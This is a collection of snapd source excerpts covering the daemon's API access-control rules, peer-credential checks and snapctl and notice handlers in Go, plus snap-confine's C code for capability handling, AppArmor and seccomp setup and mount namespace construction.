   223		return checkAccess(d, r, ucred, user, opts)
   224	}
   225	
   226	// snapAccess allows requests from the snapd-snap.socket only.
   227	type snapAccess struct{}
   228	
   229	func (ac snapAccess) CheckAccess(d *Daemon, r *http.Request, ucred *ucrednet, user *auth.UserState) *apiError {
   230		opts := accessOptions{
   231			AccessLevel: accessLevelOpen,
   232			Sockets:     []string{dirs.SnapSocket},
   233		}
   234		return checkAccess(d, r, ucred, user, opts)
   235	}
   484	// isRequestFromSnapCmd checks that the request is coming from snap command.
   485	//
   486	// It checks that the request process "/proc/PID/exe" points to one of the
   487	// known locations of the snap command. This not a security-oriented check.
   488	func isRequestFromSnapCmd(r *http.Request) (bool, error) {
   489		ucred, err := ucrednetGet(r.RemoteAddr)
   490		if err != nil {
   491			return false, err
   492		}
   493		exe, err := osReadlink(fmt.Sprintf("/proc/%d/exe", ucred.Pid))
   494		if err != nil {
   495			return false, err
   496		}
   497	
   498		// SNAP_REEXEC=0
   499		if exe == filepath.Join(dirs.GlobalRootDir, "/usr/bin/snap") {
   500			return true, nil
   501		}
   502	
   503		// Check if re-exec in snapd
   504		path := filepath.Join(dirs.SnapMountDir, "snapd/*/usr/bin/snap")
   505		if matched, err := filepath.Match(path, exe); err != nil {
   506			return false, err
   507		} else if matched {
   508			return true, nil
   509		}
   510	
   511		// Check if re-exec in core
   512		path = filepath.Join(dirs.SnapMountDir, "core/*/usr/bin/snap")
   513		if matched, err := filepath.Match(path, exe); err != nil {
   514			return false, err
   515		} else if matched {
   516			return true, nil
   517		}
   518	
   519		return false, nil
   520	}

[ucrednet.go: peer credentials]
   147	var getUcred = sys.GetsockoptUcred
   148	
   149	func (wl *ucrednetListener) Accept() (net.Conn, error) {
   150		con, err := wl.Listener.Accept()
   151		if err != nil {
   152			return nil, err
   153		}
   154	
   155		var unet *ucrednet
   156		if ucon, ok := con.(*net.UnixConn); ok {
   157			syscallConn, err := ucon.SyscallConn()
   158			if err != nil {
   159				return nil, err
   160			}
   161	
   162			var ucred *sys.Ucred
   163			scErr := syscallConn.Control(func(fd uintptr) {
   164				ucred, err = getUcred(int(fd), sys.SOL_SOCKET, sys.SO_PEERCRED)
   165			})
   166			if scErr != nil {
   167				return nil, scErr
   168			}
   169			if err != nil {
   170				return nil, err
   171			}
   172	
   173			unet = &ucrednet{
   174				Pid:    ucred.Pid,
   175				Uid:    ucred.Uid,
   176				Socket: ucon.LocalAddr().String(),
   177			}
   178		}
   179	
   180		return &ucrednetConn{con, unet}, nil

[API command access highlights]
    50	var (
    51		// see daemon.go:canAccess for details how the access is controlled
    52		rootCmd = &Command{
    53			Path:       "/",
    54			GET:        tbd,
    55			ReadAccess: openAccess{},
    56		}
    57	
    58		sysInfoCmd = &Command{
    59			Path:        "/v2/system-info",
    60			GET:         sysInfo,
    61			POST:        sysInfoPost,
    62			Actions:     []string{"advise-system-key-mismatch"},
    63			ReadAccess:  interfaceOpenAccess{Interfaces: []string{"snap-interfaces-requests-control"}},
    64			WriteAccess: openAccess{},
    65		}
    66	
    67		sysInfoStorageEncCmd = &Command{
    68			Path: "/v2/system-info/storage-encrypted",
    69			GET:  sysInfoStorageEnc,
    70			// The "status" field is publicly accessible. If additional sensitive fields
    71			// are added in the future, they must not be included in the response unless
    72			// the caller satisfies the required access constraints. Any such filtering
    73			// is performed at a lower level.
    74			ReadAccess: openAccess{},
    75		}
    92		warningsCmd = &Command{
    93			Path:        "/v2/warnings",
    94			GET:         getWarnings,
    95			POST:        ackWarnings,
    96			Actions:     []string{"okay"},
    97			ReadAccess:  openAccess{},
    98			WriteAccess: authenticatedAccess{Polkit: polkitActionManage},
    99		}
    62	var (
    63		// see daemon.go:canAccess for details how the access is controlled
    64		snapCmd = &Command{
    65			Path: "/v2/snaps/{name}",
    66			GET:  getSnapInfo,
    67			POST: postSnap,
    68			Actions: []string{
    69				installCmdAction, refreshCmdAction, revertCmdAction,
    70				switchCmdAction, holdCmdAction, unholdCmdAction,
    71				removeCmdAction, enableCmdAction, disableCmdAction,
    72			},
    73			ReadAccess:  interfaceOpenAccess{Interfaces: []string{"snap-interfaces-requests-control", "snap-refresh-observe", "desktop-launch"}},
    74			WriteAccess: authenticatedAccess{Polkit: polkitActionManage},
    75		}
    76	
    77		snapsCmd = &Command{
    78			Path: "/v2/snaps",
    79			GET:  getSnapsInfo,
    80			POST: postSnaps,
    81			Actions: []string{
    82				installCmdAction, refreshCmdAction, revertCmdAction,
    83				switchCmdAction, holdCmdAction, unholdCmdAction,
    84				snapshotCmdAction, removeCmdAction, enableCmdAction,
    85				disableCmdAction,
    86			},
    87			ReadAccess:  interfaceOpenAccess{Interfaces: []string{"snap-refresh-observe", "desktop-launch"}},
    88			WriteAccess: authenticatedAccess{Polkit: polkitActionManage},
    89		}
    38	var (
    39		snapConfCmd = &Command{
    40			Path:        "/v2/snaps/{name}/conf",
    41			GET:         getSnapConf,
    42			PUT:         setSnapConf,
    43			ReadAccess:  authenticatedAccess{Polkit: polkitActionManageConfiguration},
    44			WriteAccess: authenticatedAccess{Polkit: polkitActionManageConfiguration},
    45		}
    35		// TODO: allow to post assertions for UserOK? they are verified anyway
    36		assertsCmd = &Command{
    37			Path:        "/v2/assertions",
    38			GET:         getAssertTypeNames,
    39			POST:        doAssert,
    40			ReadAccess:  openAccess{},
    41			WriteAccess: authenticatedAccess{},
    42		}
    43	
    44		assertsFindManyCmd = &Command{
    45			Path:       "/v2/assertions/{assertType}",
    46			GET:        assertsFindMany,
    47			ReadAccess: openAccess{},
    48		}
    34	var (
    35		snapctlCmd = &Command{
    36			Path:        "/v2/snapctl",
    37			POST:        runSnapctl,
    38			WriteAccess: snapAccess{},
    39		}
    40	)
    41	
    42	var ctlcmdRun = ctlcmd.Run
    43	
    44	func runSnapctl(c *Command, r *http.Request, user *auth.UserState) Response {
    45		var snapctlPostData client.SnapCtlPostData
    46	
    47		if err := jsonutil.DecodeWithNumber(r.Body, &snapctlPostData); err != nil {
    48			return BadRequest("cannot decode snapctl request: %s", err)
    49		}
    50	
    51		if len(snapctlPostData.Args) == 0 {
    52			return BadRequest("snapctl cannot run without args")
    53		}
    54	
    55		ucred, err := ucrednetGet(r.RemoteAddr)
    56		if err != nil {
    57			return Forbidden("cannot get remote user: %s", err)
    58		}
    59	
    60		// Ignore missing context error to allow 'snapctl -h' without a context;
    61		// Actual context is validated later by get/set.
    62		context, _ := c.d.overlord.HookManager().Context(snapctlPostData.ContextID)
    63	
    64		// Make the data read from stdin available for the hook via the
    65		// context. If no context was found, calls to ensureContext() make sure
    66		// we return with error before stdin is actually used.
    67		// TODO: use a forwarded stdin here
    68		if snapctlPostData.Stdin != nil && context != nil {
    69			context.Lock()
    70			context.Set("stdin", snapctlPostData.Stdin)
    71			context.Unlock()
    72		}
    73	
    74		stdout, stderr, err := ctlcmdRun(context, snapctlPostData.Args, ucred.Uid)
    75		if err != nil {
    41	var debugCmd = &Command{
    42		Path: "/v2/debug",
    43		GET:  getDebug,
    44		POST: postDebug,
    45		Actions: []string{
    46			"add-warning", "unshow-warnings", "ensure-state-soon",
    47			"can-manage-refreshes", "prune", "stacktraces",
    48			"create-recovery-system", "migrate-home",
    49		},
    50		ReadAccess:  openAccess{},
    51		WriteAccess: rootAccess{},
    52	}
    41	var (
    42		noticesCmd = &Command{
    43			Path:        "/v2/notices",
    44			GET:         getNotices,
    45			POST:        postNotices,
    46			Actions:     []string{"add"},
    47			ReadAccess:  interfaceOpenAccess{Interfaces: []string{"snap-refresh-observe", "snap-interfaces-requests-control"}},
    48			WriteAccess: openAccess{},
    49		}
   252	func postNotices(c *Command, r *http.Request, user *auth.UserState) Response {
   253		requestUID, err := uidFromRequest(r)
   254		if err != nil {
   255			return Forbidden("cannot determine UID of request, so cannot create notice")
   256		}
   257	
   258		decoder := json.NewDecoder(r.Body)
   259		var inst noticeInstruction
   260		if err := decoder.Decode(&inst); err != nil {
   261			return BadRequest("cannot decode request body into notice instruction: %v", err)
   262		}
   263	
   264		st := c.d.overlord.State()
   265		st.Lock()
   266		defer st.Unlock()
   267	
   268		if err := inst.validate(r); err != nil {
   269			return err
   270		}
   271	
   272		noticeId, err := st.AddNotice(&requestUID, state.SnapRunInhibitNotice, inst.Key, nil)
   273		if err != nil {
   274			return InternalError("%v", err)
   275		}
   276	
   277		return SyncResponse(addedNotice{ID: noticeId})
   278	}
   279	
   280	type noticeInstruction struct {
   281		Action string           `json:"action"`
   282		Type   state.NoticeType `json:"type"`
   283		Key    string           `json:"key"`
   284		// NOTE: Data and RepeatAfter fields are not needed for snap-run-inhibit notices.
   285	}
   286	
   287	func (inst *noticeInstruction) validate(r *http.Request) *apiError {
   288		if inst.Action != "add" {
   289			return BadRequest("invalid action %q", inst.Action)
   290		}
   291		if err := state.ValidateNotice(inst.Type, inst.Key, nil); err != nil {
   292			return BadRequest("%s", err)
   293		}
   294	
   295		switch inst.Type {
   296		case state.SnapRunInhibitNotice:
   297			return inst.validateSnapRunInhibitNotice(r)
   298		default:
   299			return BadRequest(`cannot add notice with invalid type %q (can only add "snap-run-inhibit" notices)`, inst.Type)
   300		}
   301	}
   302	
   303	func (inst *noticeInstruction) validateSnapRunInhibitNotice(r *http.Request) *apiError {
   304		if fromSnapCmd, err := isRequestFromSnapCmd(r); err != nil {
   305			return InternalError("cannot check request source: %v", err)
   306		} else if !fromSnapCmd {
   307			return Forbidden("only snap command can record notices")
   308		}
   309	
   310		if err := naming.ValidateInstance(inst.Key); err != nil {
   311			return BadRequest("invalid key: %v", err)
   312		}
   313	
   314		return nil
   315	}

[snap-confine invocation/env/helper/mount/seccomp snippets]
    30	                        const char *snap_component) {
    31	    /* Snap instance name is conveyed via untrusted environment. It may be
    32	     * unset (typically when experimenting with snap-confine by hand). It
    33	     * must also be a valid snap instance name. */
    34	    if (snap_instance == NULL) {
    35	        die("cannot use NULL snap instance name");
    36	    }
    37	    sc_instance_name_validate(snap_instance, NULL);
    38	
    39	    // snap_component may be NULL if what we're confining isn't from a component
    40	    char *component_name = NULL;
    41	    char component_name_buffer[SNAP_NAME_LEN + 1] = {0};
    42	    if (snap_component != NULL) {
    43	        sc_snap_component_validate(snap_component, snap_instance, NULL);
    44	
    45	        sc_snap_split_snap_component(snap_component, NULL, 0, component_name_buffer, sizeof component_name_buffer);
    46	
    47	        component_name = component_name_buffer;
    48	    }
    49	
    50	    /* The security tag is conveyed via untrusted command line. It must be
    51	     * in agreement with snap instance name and must be a valid security
    52	     * tag. */
    53	    const char *security_tag = sc_args_security_tag(args);
    54	    if (!sc_security_tag_validate(security_tag, snap_instance, component_name)) {
    55	        die("security tag %s not allowed", security_tag);
    56	    }
    57	
    58	    /* The base snap name is conveyed via untrusted, optional, command line
    59	     * argument. It may be omitted where it implies the "core" snap is the
    60	     * base. */
    61	    const char *base_snap_name = sc_args_base_snap(args);
    62	    if (base_snap_name == NULL) {
    63	        base_snap_name = "core";
    64	    }
    65	    sc_snap_name_validate(base_snap_name, NULL);
    66	
    67	    /* The executable is conveyed via untrusted command line. It must be set
    68	     * but cannot be validated further than that at this time. It might be
    69	     * arguable to validate it to be snap-exec in one of the well-known
    70	     * locations or one of the special-cases like strace / gdb but this is
    71	     * not done at this time. */
    72	    const char *executable = sc_args_executable(args);
    73	    if (executable == NULL) {
    74	        die("cannot run with NULL executable");
    75	    }
    76	
    77	    /* Instance name length + NULL termination */
    78	    char snap_name[SNAP_NAME_LEN + 1] = {0};
    79	    sc_snap_drop_instance_key(snap_instance, snap_name, sizeof snap_name);
    80	
    81	    /* Invocation helps to pass relevant data to various parts of snap-confine. */
    82	    memset(inv, 0, sizeof *inv);
    83	    inv->base_snap_name = sc_strdup(base_snap_name);
    84	    inv->orig_base_snap_name = sc_strdup(base_snap_name);
    85	    inv->executable = sc_strdup(executable);
    86	    inv->security_tag = sc_strdup(security_tag);
    87	    inv->snap_instance = sc_strdup(snap_instance);
    88	    inv->snap_component = snap_component != NULL ? sc_strdup(snap_component) : NULL;
    89	    inv->snap_name = sc_strdup(snap_name);
    90	    inv->classic_confinement = sc_args_is_classic_confinement(args);
    91	
    92	    // construct rootfs_dir based on base_snap_name
    93	    char mount_point[PATH_MAX] = {0};
    94	    sc_must_snprintf(mount_point, sizeof mount_point, "%s/%s/current", sc_snap_mount_dir(NULL), inv->base_snap_name);
    95	    inv->rootfs_dir = sc_strdup(mount_point);
    96	
    97	    debug("security tag: %s", inv->security_tag);
    98	    debug("executable:   %s", inv->executable);
    99	    debug("confinement:  %s", inv->classic_confinement ? "classic" : "non-classic");
   100	    debug("base snap:    %s", inv->base_snap_name);
   325	    /* Collect all invocation parameters. This gives us authoritative
   326	     * information about what needs to be invoked and how. The data comes
   327	     * from either the environment or from command line arguments */
   328	    sc_invocation SC_CLEANUP(sc_cleanup_invocation) invocation;
   329	    const char *snap_instance_name_env = getenv("SNAP_INSTANCE_NAME");
   330	    if (snap_instance_name_env == NULL) {
   331	        die("SNAP_INSTANCE_NAME is not set");
   332	    }
   333	    // SNAP_COMPONENT_NAME might not be set by the environment, so callers
   334	    // should be prepared to handle NULL.
   335	    const char *snap_component_name_env = getenv("SNAP_COMPONENT_NAME");
   336	
   337	    // Who are we?
   338	    uid_t real_uid, effective_uid, saved_uid;
   339	    gid_t real_gid, effective_gid, saved_gid;
   340	    if (getresuid(&real_uid, &effective_uid, &saved_uid) != 0) {
   341	        die("getresuid failed");
   342	    }
   343	    if (getresgid(&real_gid, &effective_gid, &saved_gid) != 0) {
   344	        die("getresgid failed");
   345	    }
   346	    debug("ruid: %d, euid: %d, suid: %d", real_uid, effective_uid, saved_uid);
   347	    debug("rgid: %d, egid: %d, sgid: %d", real_gid, effective_gid, saved_gid);
   348	
   349	    struct sc_apparmor apparmor;
   350	    sc_init_apparmor_support(&apparmor);
   351	    if (!apparmor.is_confined && apparmor.mode != SC_AA_NOT_APPLICABLE && real_uid != 0) {
   352	        // Refuse to run when this process is running unconfined on a system
   353	        // that supports AppArmor when the effective uid is root and the real
   354	        // id is non-root.  This protects against, for example, unprivileged
   355	        // users trying to leverage the snap-confine in the core snap to
   356	        // escalate privileges.
   357	        errno = 0;  // errno is insignificant here
   358	        die("snap-confine has elevated permissions and is not confined"
   359	            " but should be. Refusing to continue to avoid"
   360	            " permission escalation attacks\n"
   361	            "Please make sure that the snapd.apparmor service is enabled and started.");
   362	    }
   363	
   364	    sc_debug_capabilities("initial caps");
   365	
   366	    static const cap_value_t snap_confine_caps[] = {
   367	        CAP_DAC_OVERRIDE,     // poking around as a regular user
   368	        CAP_DAC_READ_SEARCH,  // same as above
   369	        CAP_SYS_ADMIN,        // mounts, unshare
   370	        CAP_SYS_CHROOT,       // pivot_root into a new root
   371	        CAP_CHOWN,            // file ownership
   372	        CAP_FOWNER,           // to create tmp dir with sticky bit
   373	        CAP_SYS_PTRACE,       // to inspect the mount namespace of PID1
   374	        // TODO: when removing the manual adjustment to memlock limit, remove this capability as well.
   375	        // The capability is to support the logic needed for 5.11 kernels.
   376	        CAP_SYS_RESOURCE,  // to raise memlock limit before setting up device eBPF program.
   377	    };
   378	
   379	    /* We may be invoking tools such as snap-update-ns or snap-discard which are
   380	     * executed in a forked process, the child can inherit at most these
   381	     * capabilities */
   382	    static const cap_value_t helper_tools_inheritable_caps[] = {
   383	        CAP_DAC_OVERRIDE,  // poking around as a regular user
   384	        CAP_SYS_ADMIN,     // mounts
   385	        CAP_CHOWN,         // file ownership
   386	    };
   387	
   388	    /* Capability setup:
   389	     * 1. Permitted caps are obtained from file.
   390	     * 2. Restore those capabilities that we really need into the
   391	     *    "effective" set.
   392	     * 3. Capabilities needed by either us or by any of our child processes
   393	     *    need to be set into the "permitted" set.
   394	     * 4. Capabilities needed by our helper child processes need to be set
   395	     *    into the "permitted", "inheritable" and "ambient" sets.
   396	     *
   397	     * Before executing the snap application we'll drop all capabilities.
   398	     */
   399	
   400	    /* Set of caps for executing privileged operations. */
   401	    cap_t caps_privileged SC_CLEANUP(sc_cleanup_cap_t) = cap_get_proc();
   402	    if (caps_privileged == NULL) {
   403	        die("cannot obtain current caps");
   404	    }
   405	
   406	    /* Assert all our expected capabilities are permitted */
   407	    sc_cap_assert_permitted(caps_privileged, snap_confine_caps, SC_ARRAY_SIZE(snap_confine_caps),
   408	                            "snap-confine is packaged without necessary permissions and cannot continue\n");
   409	
   410	    if (cap_set_flag(caps_privileged, CAP_EFFECTIVE, SC_ARRAY_SIZE(snap_confine_caps), snap_confine_caps, CAP_SET) !=
   411	        0) {
   412	        die("cannot fill effective capability set");
   413	    }
   414	
   415	    /* inheritable caps when forking off to a helper tool */
   416	    if (cap_set_flag(caps_privileged, CAP_INHERITABLE, SC_ARRAY_SIZE(helper_tools_inheritable_caps),
   417	                     helper_tools_inheritable_caps, CAP_SET) != 0) {
   418	        die("cannot fill inheritable capability set");
   419	    }
   420	
   483	    // Figure out what is the SNAP_MOUNT_DIR in practice.
   484	    sc_probe_snap_mount_dir_from_pid_1_mount_ns(AT_FDCWD, &err);
   485	    sc_die_on_error(err);
   486	
   487	    debug("SNAP_MOUNT_DIR (probed): %s", sc_snap_mount_dir(NULL));
   488	
   489	    sc_init_invocation(&invocation, args, snap_instance_name_env, snap_component_name_env);
   490	
   551	    // Temporarily drop all effective capabilities, since we don't need any for
   552	    // a while. Note, we keep CAP_SYS_ADMIN in permitted as it will be needed
   553	    // later.
   554	    debug("dropping caps");
   555	    sc_debug_capabilities("before dropping effective caps");
   556	    if (cap_set_proc(caps_no_effective) != 0) {
   557	        die("cannot drop capabilities");
   558	    }
   559	
   560	    sc_debug_capabilities("after dropping effective caps");
   561	
   562	    // Ensure that the user data path exists. When creating it use the identity
   563	    // of the calling user (by using real user and group identifiers). This
   564	    // allows the creation of directories inside ~/ on NFS with root_squash
   565	    // attribute.
   566	    setup_user_data();
   567	
   568	    // https://wiki.ubuntu.com/SecurityTeam/Specifications/SnappyConfinement
   569	    sc_maybe_aa_change_onexec(&apparmor, invocation.security_tag);
   570	#ifdef HAVE_SELINUX
   571	    // For classic and confined snaps
   572	    sc_selinux_set_snap_execcon();
   573	#endif
   574	    if (snap_context != NULL) {
   575	        setenv("SNAP_COOKIE", snap_context, 1);
   576	        // for compatibility, if facing older snapd.
   577	        setenv("SNAP_CONTEXT", snap_context, 1);
   578	    }
   579	    // To load a seccomp profile, we need either CAP_SYS_ADMIN or
   580	    // PR_SET_NO_NEW_PRIVS. Since NNP causes issues with AppArmor and exec
   581	    // transitions in certain snapd interfaces, keep CAP_SYS_ADMIN temporarily
   582	    // when we are permanently dropping privileges.
   583	    debug("setting capabilities bounding set");
   584	
   585	    /* we're going to drop caps when user isn't root, which preserves the spirit
   785	
   786	static void enter_non_classic_execution_environment(sc_invocation *inv, struct sc_apparmor *aa, uid_t real_uid,
   787	                                                    gid_t real_gid, gid_t saved_gid) {
   788	    // main() reassociated with the mount ns of PID 1 to make /run/snapd/ns
   789	    // visible
   790	
   791	    // Find and open snap-update-ns and snap-discard-ns from the same
   792	    // path as where we (snap-confine) were called.
   793	    int snap_update_ns_fd SC_CLEANUP(sc_cleanup_close) = -1;
   794	    snap_update_ns_fd = sc_open_snap_update_ns();
   795	    int snap_discard_ns_fd SC_CLEANUP(sc_cleanup_close) = -1;
   796	    snap_discard_ns_fd = sc_open_snap_discard_ns();
   797	
   798	    // Do per-snap initialization.
   799	    int snap_lock_fd = sc_lock_snap(inv->snap_instance);
   800	
   801	    // This is a workaround for systemd v237 (used by Ubuntu 18.04) for non-root users
   802	    // where a transient scope cgroup is not created for a snap hence it cannot be tracked
   803	    // before the freezer cgroup is created (and joined) below.
   804	    if (sc_snap_is_inhibited(inv->snap_instance, SC_SNAP_HINT_INHIBITED_FOR_REMOVE)) {
   805	        // Prevent starting new snap processes when snap is being removed until
   806	        // the freezer cgroup is created below and the snap lock is released so
   807	        // that remove change can track running processes through pids under the
   808	        // freezer cgroup.
   809	        die("snap is currently being removed");
   810	    }
   811	
   812	    debug("initializing mount namespace: %s", inv->snap_instance);
   813	    struct sc_mount_ns *group = NULL;
   814	    group = sc_open_mount_ns(inv->snap_instance);
   815	
   816	    // Init and check rootfs_dir, apply any fallback behaviors.
   817	    sc_check_rootfs_dir(inv);
   818	
  1018	                         snap_confine_caps_extra_cgroup_v1, CAP_CLEAR) != 0) {
  1019	            die("cannot clear permitted capability set (setuid, setgid)");
  1020	        }
  1021	        sc_debug_capabilities("before cap_set_proc (drop)");
  1022	        if (cap_set_proc(c) != 0) {
  1023	            die("cannot set reduced capabilities (setuid, setgid)");
  1024	        }
  1025	    }
  1026	
  1027	    sc_unlock(snap_lock_fd);
  1028	
  1029	    sc_close_mount_ns(group);
  1030	
  1031	    // Reset path as we cannot rely on the path from the host OS to make sense.
  1032	    // The classic distribution may use any PATH that makes sense but we cannot
  1033	    // assume it makes sense for the core snap layout. Note that the /usr/local
  1034	    // directories are explicitly left out as they are not part of the core
  1035	    // snap.
  1036	    debug("resetting PATH and SHELL to values in sync with core snap");
  1037	    setenv("PATH",
  1038	           "/usr/local/sbin:"
  1039	           "/usr/local/bin:"
  1040	           "/usr/sbin:"
  1041	           "/usr/bin:"
  1042	           "/sbin:"
  1043	           "/bin:"
  1044	           "/usr/games:"
  1045	           "/usr/local/games",
  1046	           1);
  1047	
  1048	    // Reset SHELL for non-classic snaps to /bin/bash which is present in core,
  1049	    // core18, core20, core22 and core24. The bare base snap does not have a shell
  1050	    // so no special case is necessary there.
  1051	    setenv("SHELL", "/bin/bash", 1);
  1052	
  1053	    // Ensure we set the various TMPDIRs to /tmp. One of the parts of setting
  1054	    // up the mount namespace is to create a private /tmp directory (this is
  1055	    // done in sc_populate_mount_ns() above). The host environment may point to
  1056	    // a directory not accessible by snaps so we need to reset it here.
  1057	    const char *tmpd[] = {"TMPDIR", "TEMPDIR", NULL};
  1058	    int i;
  1059	    for (i = 0; tmpd[i] != NULL; i++) {
  1060	        if (setenv(tmpd[i], "/tmp", 1) != 0) {
  1061	            die("cannot set environment variable '%s'", tmpd[i]);
  1062	        }
  1063	    }
  1064	}
    77	int sc_open_snap_update_ns(void) { return sc_open_snapd_tool("snap-update-ns"); }
    78	
    79	void sc_call_snap_update_ns(int snap_update_ns_fd, const char *snap_name, struct sc_apparmor *apparmor) {
    80	    char *snap_name_copy SC_CLEANUP(sc_cleanup_string) = NULL;
    81	    snap_name_copy = sc_strdup(snap_name);
    82	
    83	    char aa_profile[PATH_MAX] = {0};
    84	    sc_must_snprintf(aa_profile, sizeof aa_profile, "snap-update-ns.%s", snap_name);
    85	
    86	    char *argv[] = {"snap-update-ns",
    87	                    /* This tells snap-update-ns we are calling from snap-confine and locking is in place */
    88	                    "--from-snap-confine", snap_name_copy, NULL};
    89	    char *envp[] = {"SNAPD_DEBUG=x", NULL};
    90	
    91	    /* keep the current identity, privileges are carried over through capabilities */
    92	    const cap_value_t caps[] = {
    93	        CAP_DAC_OVERRIDE, /* poking around as a regular user */
    94	        CAP_SYS_ADMIN,    /* mounts */
    95	        CAP_CHOWN,        /* file ownership */
    96	    };
    97	    sc_tool_privs privs = {
    98	        .n_caps = SC_ARRAY_SIZE(caps),
    99	        .caps = caps,
   100	    };
   101	    sc_call_snapd_tool_with_apparmor(snap_update_ns_fd, "snap-update-ns", apparmor, aa_profile, privs, argv, envp);
   167	static int sc_open_snapd_tool(const char *tool_name) {
   168	    // +1 is for the case where the link is exactly PATH_MAX long but we also
   169	    // want to store the terminating '\0'. The readlink system call doesn't add
   170	    // terminating null, but our initialization of buf handles this for us.
   171	    char buf[PATH_MAX + 1] = {0};
   172	    if (readlink("/proc/self/exe", buf, sizeof(buf) - 1) < 0) {
   173	        die("cannot readlink /proc/self/exe");
   174	    }
   175	    if (buf[0] != '/') {  // this shouldn't happen, but make sure have absolute path
   176	        die("readlink /proc/self/exe returned relative path");
   177	    }
   178	    // as we are looking up other tools relative to our own path, check
   179	    // we are located where we think we should be - otherwise we
   180	    // may have been hardlink'd elsewhere and then may execute the
   181	    // wrong tool as a result
   182	    if (!sc_is_expected_path(buf)) {
   183	        die("running from unexpected location: %s", buf);
   184	    }
   185	    char *dir_name = dirname(buf);
   186	    int dir_fd SC_CLEANUP(sc_cleanup_close) = -1;
   187	    dir_fd = open(dir_name, O_PATH | O_DIRECTORY | O_NOFOLLOW | O_CLOEXEC);
   188	    if (dir_fd < 0) {
   189	        die("cannot open path %s", dir_name);
   190	    }
   191	    int tool_fd = -1;
   192	    tool_fd = openat(dir_fd, tool_name, O_PATH | O_NOFOLLOW | O_CLOEXEC);
   193	    if (tool_fd < 0) {
   194	        die("cannot open path %s/%s", dir_name, tool_name);
   195	    }
   196	    debug("opened %s executable as file descriptor %d", tool_name, tool_fd);
   197	    return tool_fd;
   236	        /* If the caller provided template environment entry for SNAPD_DEBUG
   237	         * then expand it to the actual value. */
   238	        for (char **env = envp;
   239	             /* Mama mia, that's a spicy meatball. */
   240	             env != NULL && *env != NULL && **env != '\0'; env++) {
   241	            if (sc_streq(*env, "SNAPD_DEBUG=x")) {
   242	                /* NOTE: this is not released, on purpose. */
   243	                char *entry = sc_strdup(*env);
   244	                entry[strlen("SNAPD_DEBUG=x") - 1] = sc_is_debug_enabled() ? '1' : '0';
   245	                *env = entry;
   246	            }
   247	        }
   248	        /* Switch apparmor profile for the process after exec. */
   249	        if (apparmor != NULL && aa_profile != NULL) {
   250	            sc_maybe_aa_change_onexec(apparmor, aa_profile);
   251	        }
   252	        fexecve(tool_fd, argv, envp);
   253	        die("cannot execute snapd tool %s", tool_name);
   507	static void sc_bootstrap_mount_namespace(const struct sc_mount_config *config) {
   508	    char scratch_dir[] = "/tmp/snap.rootfs_XXXXXX";
   509	    char src[PATH_MAX] = {0};
   510	    char dst[PATH_MAX] = {0};
   511	    if (mkdtemp(scratch_dir) == NULL) {
   512	        die("cannot create temporary directory for the root file system");
   513	    }
   514	    // NOTE: at this stage we just called unshare(CLONE_NEWNS). We are in a new
   515	    // mount namespace and have a private list of mounts.
   516	    debug("scratch directory for constructing namespace: %s", scratch_dir);
   517	    // Make the root filesystem recursively shared. This way propagation events
   518	    // will be shared with main mount namespace.
   519	    sc_do_mount("none", "/", NULL, MS_REC | MS_SHARED, NULL);
   520	    // Bind mount the temporary scratch directory for root filesystem over
   521	    // itself so that it is a mount point. This is done so that it can become
   522	    // unbindable as explained below.
   523	    sc_do_mount(scratch_dir, scratch_dir, NULL, MS_BIND, NULL);
   524	    // Make the scratch directory unbindable.
  1019	void sc_setup_user_mounts(struct sc_apparmor *apparmor, int snap_update_ns_fd, const char *snap_name) {
  1020	    debug("%s: %s", __FUNCTION__, snap_name);
  1021	
  1022	    char profile_path[PATH_MAX];
  1023	    struct stat st;
  1024	
  1025	    sc_must_snprintf(profile_path, sizeof(profile_path), "/var/lib/snapd/mount/snap.%s.user-fstab", snap_name);
  1026	    if (stat(profile_path, &st) != 0) {
  1027	        // It is ok for the user fstab to not exist.
  1028	        return;
  1029	    }
  1030	
  1031	    // In our new mount namespace, recursively change all mounts
  1032	    // to slave mode, so we see changes from the parent namespace
  1033	    // but don't propagate our own changes.
  1034	    sc_do_mount("none", "/", NULL, MS_REC | MS_SLAVE, NULL);
  1035	    sc_call_snap_update_ns_as_user(snap_update_ns_fd, snap_name, apparmor);
  1036	}
   205	struct sc_mount_ns *sc_open_mount_ns(const char *group_name) {
   206	    struct sc_mount_ns *group = sc_alloc_mount_ns();
   207	    group->dir_fd = open(sc_ns_dir, O_DIRECTORY | O_PATH | O_CLOEXEC | O_NOFOLLOW);
   208	    if (group->dir_fd < 0) {
   209	        die("cannot open directory %s", sc_ns_dir);
   210	    }
   211	    group->name = sc_strdup(group_name);
   212	    return group;
   553	int sc_join_preserved_ns(struct sc_mount_ns *group, struct sc_apparmor *apparmor, const sc_invocation *inv,
   554	                         int snap_discard_ns_fd) {
   555	    // Open the mount namespace file.
   556	    char mnt_fname[PATH_MAX] = {0};
   557	    sc_must_snprintf(mnt_fname, sizeof mnt_fname, "%s.mnt", group->name);
   558	    int mnt_fd SC_CLEANUP(sc_cleanup_close) = -1;
   559	    // NOTE: There is no O_EXCL here because the file can be around but
   560	    // doesn't have to be a mounted namespace.
   561	    mnt_fd = openat(group->dir_fd, mnt_fname, O_RDONLY | O_CLOEXEC | O_NOFOLLOW, 0600);
   562	    if (mnt_fd < 0 && errno == ENOENT) {
   563	        return ESRCH;
   564	    }
   565	    if (mnt_fd < 0) {
   566	        die("cannot open preserved mount namespace %s", group->name);
   603	int sc_join_preserved_per_user_ns(struct sc_mount_ns *group, const char *snap_name) {
   604	    uid_t uid = getuid();
   605	    char mnt_fname[PATH_MAX] = {0};
   606	    sc_must_snprintf(mnt_fname, sizeof mnt_fname, "%s.%d.mnt", group->name, (int)uid);
   607	
   608	    int mnt_fd SC_CLEANUP(sc_cleanup_close) = -1;
   609	    mnt_fd = openat(group->dir_fd, mnt_fname, O_RDONLY | O_CLOEXEC | O_NOFOLLOW, 0600);
   610	    if (mnt_fd < 0 && errno == ENOENT) {
    73	static void validate_path_has_strict_perms(const char *path) {
    74	    struct stat stat_buf;
    75	    if (stat(path, &stat_buf) < 0) {
    76	        die("cannot stat %s", path);
    77	    }
    78	
    79	    errno = 0;
    80	    if (stat_buf.st_uid != 0 || stat_buf.st_gid != 0) {
    81	        die("%s not root-owned %i:%i", path, stat_buf.st_uid, stat_buf.st_gid);
    82	    }
    83	
    84	    if (stat_buf.st_mode & S_IWOTH) {
    85	        die("%s has 'other' write %o", path, stat_buf.st_mode);
    86	    }
    87	}
    88	
    89	static void validate_bpfpath_is_safe(const char *path) {
   198	bool sc_apply_seccomp_profile_for_security_tag(const char *security_tag) {
   199	    debug("loading bpf program for security tag %s", security_tag);
   200	
   201	    char profile_path[PATH_MAX] = {0};
